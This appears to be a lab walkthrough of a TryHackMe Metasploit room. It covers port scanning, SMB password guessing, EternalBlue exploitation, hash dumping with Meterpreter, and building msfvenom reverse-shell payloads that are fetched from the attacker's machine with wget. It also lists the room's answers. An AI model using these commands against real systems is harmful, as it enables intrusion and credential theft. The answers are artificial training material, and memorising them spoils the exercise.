# Metasploit: Exploitation

*Also in: Cyber Security 101 - section 7, room 3*

## [Task 1] Introduction

Our focus in this room is actually using Metasploit to scan for vulnerabilities and leverage exploits. We'll look at how the database is used to make pentesting engagements manageable, and how we can use `msfvenom` to generate payloads and start Meterpreter against target platforms.

Some questions may need a wordlist; in the AttackBox, we'll want to use `/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt`. The task files contain this wordlist in case you want to work this through on your own machine.

## [Task 2] Scanning

We will start the attached VM to work through these exercises. We'll start with some modules that can be used to scan for open ports on the target system/network. You can look for port scanning modules by running `search portscan`. When running a port scanner, you may need to set some options:
- CONCURRENCY: Allows you to set the number of targets to be scanned simultaneously
- PORTS: The port range to scan. Metasploit will scan ports from 1 to 1000 sequentially, whereas Nmap scans the top 1000 used ports. You can change these to different ranges, e.g. `x-y`.
- RHOSTS: The target/target network to scan.
- THREADS: Number of threads to use simultaneously in scans. More threads give faster scans.

Note that you can use `nmap` from `msfconsole` to run scans faster. Metasploit might not be your first choice when it comes to information gathering, but it can certainly help.

To quickly identify services running on UDP, you can use `scanner/discovery/udp_sweep`. It doesn't extensively scan for all possible UDP services, but it quickly identifies DNS, NetBIOS, and other such services.

Metasploit also allows you to scan specific services with modules like `smb_enumshares` and `smbb_version`. You should look at what options you have on your own system.

You should not omit the "exotic" services like NetBIOS - this specifically allows computers to communicate over the network to share files and send files to printers. NetBIOS names can give you an idea of what their roles are and how important they are. You can even run into some shared files and folders that can be accessed without a password (or protected with a simple password).

Metasploit has modules that can give you a better understanding of the target system; you should do a search to see if there are any modules that can be helpful, based on the target.

For this first question, we'll run `scanner/portscan/tcp` against the target system. We'll just set up the `RHOSTS` so that it's the machine IP. It's sufficient to just change that particular setting, though you may want to consider other changes as needed for the target system.

![image](https://github.com/user-attachments/assets/d411e520-6421-4f64-a19a-3a381d67cb8b)

Note that I've used `setg` from here to set the RHOSTS value for all modules.

**[Task 2, Question 1] How many ports are open on the target system?** - 5

If we run `search netbios` we can see a list of some NetBIOS modules - we'll probably want to use the `auxiliary/scanner/netbios/nbname` module, since it gies us some basic information:

![image](https://github.com/user-attachments/assets/cddb115f-5ee3-4a7b-9367-a0ad577c230c)

Running the module gives us the following information:

![image](https://github.com/user-attachments/assets/1055c77e-d59a-41ba-933d-582cb1d7e169)

**[Task 2, Question 2] Using the relevant scanner, what NetBIOS name can you see?** - ACME IT SUPPORT

Now we're being asked about what's running on port 8000. Port 8000 can be used by certain HTTP servers, and the hint clues us in to use `http_version`, so let's. Note that when we use `scanner/http/http_version`, we need to set RPORT to 8000:

![image](https://github.com/user-attachments/assets/f51894c9-d79d-4a8b-b012-cb1e5c1f55b4)

When we run the module, we get:

![image](https://github.com/user-attachments/assets/c8a76c39-0d83-44ea-92ff-084e37fe14fc)

**[Task 2, Question 3] What is running on port 8000?** - `webfs/1.21`

For this last question, we can use `auxiliary/scanner/smb/smb_login` to try logging into different SMB accounts. We know we need to log into the `penny` account, so we'll run `set SMBUser penny`. To set the password wordlist, we run `set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt`. This yields:

![image](https://github.com/user-attachments/assets/32ba0b30-9b4f-460f-98f6-60588e4376b2)

**[Task 2, Question 4] What is the `penny` user's SMB password? Use the wordlist mentioned in the previous task.** - `leo1234`

A different VM will be used for later tasks, so terminate this VM.

## [Task 3] The Metasploit Database

For an actual pentesting exercise, you will likely have to work with several targets. Metasploit allows you to maintain a database to simplify project management and set up parameter avlues. This will require the PostgreSQL database, which you can start by running `systemctl start postgresql` in Linux. Then you initialize the Metasploit database with `msfdb init` in the regular command prompt. Then you can launch `msfconsole` and check the database status by running `db_status`.

The database feautre lets you create different workspaces to isolate different projects. You'll be in the default workspace when you start, and you can list avvailable workspaces with the `workspace` command.

You can add workspaces by using `workspace -a (NAME)` and delete a workspace by running `workspace -d (NAME)`.  You can see more options for the Workspace command by running `workspace -h`. When Metasploit is launched with a database, you can see the database backend commands by checking `help`.

If you run an Nmap scan with `db_nmap`, this will save all the results to the database. This lets you get information relevant to hosts and services on target systems with the `hosts` and `services` commands. Running `hosts -h` and `services -h` will give oyu more options to work with. Once host information is stored in the database, you can use `hosts -R` to add the value to the `RHOSTS` parameter.

If there are multiple hosts saved to the database, all IP addresses are used with the `hosts -R` command. Typically, in pentesting, we find available hosts with `db_nmap` and scan these for further vulnerabilities or open ports with a port scanning module.

When `services -S (KEYWORD)` is run, you can search for specific services in the environment based on keywords. You may want to look for
- HTTP: Some web apps may have SQL injection/RCE vulnerabilities.
- FTP: Some FTP servers may allow anonymous login and provide access to specific files.
- SMB: Some servers may be vulnerable to low-hanging fruit, e.g. EternalBlue
- SSH: Some SSH servers may have default/easy-to-guess passwords
- RDP: Some systems may be vulnerable to low-hanging fruit like BlueKeep, or allow desktop access with weak credentials.

## [Task 4] Vulnerability Scanning

Metasploit lets you quickly identify critical vulnerabilities - the low-hanging fruit. These are easily identifiable and exploitable vulnerabilities that could let you get a foothold in the system and gain high-level privileges. Finding vulnerabilities relies on your ability to scan and fingerprint the target; the more information you can get, the better you can use Metasploit.

Once you figure out what's on the system, you can look for exploits pertaining to it. Remember you can check `info` for more information about a given exploit.

We can look for, say, an SMTP open relay scanner if we run `search smtp relay`. Running `info` about this module allows us to see information about who wrote the module:

![image](https://github.com/user-attachments/assets/1b911350-942e-42cb-875f-6c2fdfc4d474)

**[Task 4, Question 1] Who wrote the module that allows us to check SMTP servers for open relay?** - Campbell Murray

## [Task 5] Exploitation

Exploits are the most populated module category in Metasploit, as you may reasonably expect. You can search for exploits with `search`, get more information with the `info` command, and run the exploit with `exploit`. Successfully using Metasploit, as simple as this may be, requires an understanding of what's running on the target system.

Most exploits have a preset default payload, but you can use `show payloads` to list other payloads you can use with that specific exploit. Once you've decided on the paayload, use `set payload` to make your choice. Choosing the correct payload may be a trial-and-error process due to OS/environmental restrictions, including firewalls, antiviruses, and the lack of certain programs to execute the payload.

Some payloads open new parameters that you may need to set. Run `show options` to see these. A reverse payload may require you to set the `LHOST` option, for instance.

When a session is opened, you can background it with `CTRL+Z` or use `CTRL+C` to abort it. Backgrounding a session may be good when you're working with multiple targets simultaneously, or on the same target with a different exploit/shell.

To list all active sessions, run `sessions`. There are additional options there to help you manage sessions better. You can interact with any existing sessions with `sessions -i` followed by the session ID.

The second target VM, incidentally, is vulnerable to EternalBlue. Launch it. Then we can do the following:
1. Run `use exploit/windows/smb/ms17_010_eternalblue`. The payload should work perfectly fine for this task.
2. Set `RHOSTS` to be the new target IP address. The `LHOST` and `LPORT` should be already set; set those if not.
3. Run the `exploit` command. After some time passes, you should have access to Meterpreter.

From there, you can see what's going on in the system. We're looking for a flag right now, so we can run `search -f flag.txt` in Meterpreter.

![image](https://github.com/user-attachments/assets/268a4912-72f7-4742-9bfe-87a7b9d96185)

After some time passes, we should be able to see the file's location. It's in `C:\Users\John\Documents\flag.txt`. We can see its contents by navigating to the file with `cd` and running `cat flag.txt`.

![image](https://github.com/user-attachments/assets/ca9edf51-1b9a-48ad-b7d6-715b4043ff0b)

**[Task 5, Questio n1] What is the content of the `flag.txt` file?** - `THM-5455554845`

We can do a lot of stuff with Meterpreter. For instance, we can dump all the hashes now that we've got privileged access to the system. Running `hashdump` gives us:

![image](https://github.com/user-attachments/assets/b9483a98-65d4-4142-a3ac-14ae07c5a5db)

The password hash is the last string of characters after the colon.

**[Task 5, Question 2] What is the NTLM hash of the password of the user `pirate`?** - 8ce9a3ebd1647fcc5e04025019f4b875

## [Task 6] Msfvenom

Now let's talk about how to generate payloads. The `msfvenom` command can be used for this; it supercedes `msfpayload` and `msfencode`. This lets you build payloads in different formats and for different target systems.

Standalone payloads can be generated, or you can get a usable raw format. The `msfvenom --list formats` command can be used to list supported output formats. The command `msfvenom -p (PAYLOAD) LHOST=(ATTACKING_IP) LPORT=(ATTACKING_PORT)`. can be used as a basis for creating payloads. The `-f (FORMAT)` allows you to set the format of the payload. If you're using the raw format, you can redirect the generated code by adding `> (OUTPUT_FILE)`.

Encoders encode the payload, and this may be effective against certain antivirus software. That said, you should still use more modern obfuscation techniques or methods to inject shellcode. You can use `-e (ENCODING)` to change the encoding method.

You will need to accept incoming connections generated by `msfvenom`. When using an exploit module, this part will be handled by the exploit module automatically; the `payload options` title will appear when setting a reverse shell. The term most commonly used to receive a connection from a target is "catching a shell." Reverse shells/Meterpreter callbacks generated in `msfvenom` can be caught with a handler.

To exploit a vulnerability with `msfvenom`, you need to do the following:
1. Generate the exploit code with `msfvenom`.
2. Start Metasploit's handler.
3. Execute the code - it may be a PHP shell or something else.

You may need to edit the generated file depending on your situation. For instance, the PHP tag might be commented out in PHP exploit code. You'll have to add it in if that's the case with `nano`.

To receive incoming connections, run `use exploit/multi/handler` from within Metasploit. The multi handler can be used for all Metasploit payloads, Meterpreter, and regular shells. To use it, set the payload value (this will be based on whatever you generated with `msfvenom`), the LHOST, and the LPORT values. Then `run` the handler and wait for the incoming connection. When the reverse shell is triggered, the connection will be received by the multi handler and give us a shell.

Based on the target system configuration, `msfvenom` can be used to create payloads in almost all formats. Here are some common examples:
- Executable and Linkable Format, ELF: `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf` --> this is similar to `.exe` files in Windows. These are executable files for Linux, but you need to make sure that they're executable on the target machine (i.e., by using `chmod +x`). Then you can run it with `./(ELF_FILE)`.
- Windows: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`
- PHP: `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`
- ASP: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`
- Python: `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`

These are all reverse payloads, so you need to have the multi handler working on the attacker machine, set with the correct parameters. The required values - payload, LHOST, LPORT - will be the same you set when creating the `msfvenom` payload.

Let's try it! We'll start the third VM. The username is `murphy` and the password is `1q2w3e4r`. It'll start in Split-Screen View, though you can use SSH if you'd like. In the terminal, you can type `sudo su` to get a root shell.

![image](https://github.com/user-attachments/assets/c87c5db4-71db-4ab7-ab84-78f9ffaa26c1)

We'll create a payload with `msfvenom`. It specifically needs to be in ELF format, so we can use the format described above, replacing the LHOST with the target machine IP and the LPORT with a port like `4444`.

![image](https://github.com/user-attachments/assets/58d92166-6e5a-46d1-9c4c-84c49f234f77)

From there, we start a Python web server with `python3 -m http.server 9000`. This will allow us to transfer the reverse shell we created:

![image](https://github.com/user-attachments/assets/638fcbd5-8a82-43d1-ac05-d443b7af1de2)

...and on the VM we run `wget http://(ATTACKING_MACHINE_IP):9000/rev_shell.elf` to download it.

![image](https://github.com/user-attachments/assets/ea7ba3e5-8add-4edf-89f4-99404a21475a)

We'll need to start the multi handler on our machine. We can stop the Python web server once the file was transferred. We set the settings in Metasploit as we did before and then run the handler:

![image](https://github.com/user-attachments/assets/fb2539b5-00d4-4f06-be8b-59e3177b2d2f)

Then we run the exploit code in the other VM. We have to use `chmod +x rev_shell.elf` first, and then run `./rev_shell.elf` to start the exploit code. You may need to have the other VM in a separate window by clicking the "View in Full Screen" button in order for Meterpreter to work.

Once you do all this, you can dump hashes. We'll need to do a little legwork to make this happen though. We first background the Meterpreter session, and then `use post/linux/gather/hashdump` and set the options. We need to specify the Meterpreter session in order for this to work - for me, it had the ID 2 because the first Meterpreter session unexpectedly died on me.

![image](https://github.com/user-attachments/assets/a5aa4087-9b92-44b5-bd5e-c48991cddbd9)

When we run the module, we get the following hashes. We're looking for claire's specifically:

![image](https://github.com/user-attachments/assets/7756e0fa-945c-4d11-8b17-32cd4b2c94d1)

The password hash comes right after Claire's username.

**[Task 6, Question 1] What is the other user's password hash?** - `$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0`

## [Task 7] Summary

This was a more hands-on room in which we learned how to use Metasploit to find and exploit vulnerabilities. We've also learned about how the database feature can help with managing many targets, as well as how to use `msfvenom` to generate standalone payloads. These payloads are useful if you have the ability to upload/download files to a system.
